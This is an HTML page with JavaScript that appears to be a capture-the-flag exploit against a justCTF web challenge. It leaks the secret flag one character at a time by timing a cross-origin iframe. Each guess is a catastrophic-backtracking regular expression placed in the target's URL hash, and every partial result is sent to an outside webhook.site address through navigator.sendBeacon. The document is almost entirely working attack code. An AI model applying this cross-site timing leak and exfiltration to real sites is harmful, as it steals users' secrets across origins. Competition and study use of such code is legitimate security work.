<body>
</body>
<script>
async function sleep(ms = 0) {
    return new Promise(r => setTimeout(r, ms));
}
var delay_iframe = document.createElement('iframe');
document.body.appendChild(delay_iframe); 
var date_time0;
var date_time1;
var flag = "justCTF{cross";
var candidate = "abcdefghijklmnopqrstuvwxyz_}";

async function ini(c){
    date_time0 = Date.now();
    delay_iframe.src="https://computeration.web.jctf.pro/";
    return new Promise(resolve => { 
        delay_iframe.onload = async () => {
            await test(c);
            resolve();
        }  //need to wait iframee to load and then modify the hash
    })
}

async function test(c){
    delay_iframe.src=`https://computeration.web.jctf.pro/#^(?=${flag+c}).*.*.*.*.*.*.*.*.*!$`;
    let iframee2 = document.createElement('iframe');
    iframee2.src="https://computeration.web.jctf.pro";
    document.body.appendChild(iframee2);
    return new Promise(resolve => { iframee2.onload = () => {
        date_time1 = Date.now();
        iframee2.remove();
        resolve();
    }});
}
async function start(){
    while(1){
        navigator.sendBeacon("https://webhook.site/ebf8aa6a-e1af-40da-98bc-c8c64d920b0b",flag)
        console.log(flag);
        for (let c of candidate){
            await ini(c);
            let time_change = date_time1-date_time0;
            if(time_change>3000){
                flag += c;
                break;
            }
        }
    }
}
start();
</script>